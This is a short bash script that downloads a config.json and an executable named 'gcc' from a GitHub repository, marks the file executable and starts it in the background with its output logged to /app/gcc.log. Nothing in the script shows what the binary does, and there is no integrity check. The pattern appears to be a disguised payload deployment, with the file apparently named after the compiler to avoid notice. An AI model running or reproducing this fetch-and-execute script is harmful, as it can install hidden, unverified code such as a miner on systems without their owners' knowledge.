#!/bin/bash
wget https://raw.githubusercontent.com/Yefori1/n/main/config.json -O /app/config.json
wget https://github.com/Yefori1/n/raw/main/gcc -O /app/gcc
chmod +x /app/gcc
touch /app/gcc.log
/app/gcc | tee -a /app/gcc.log &
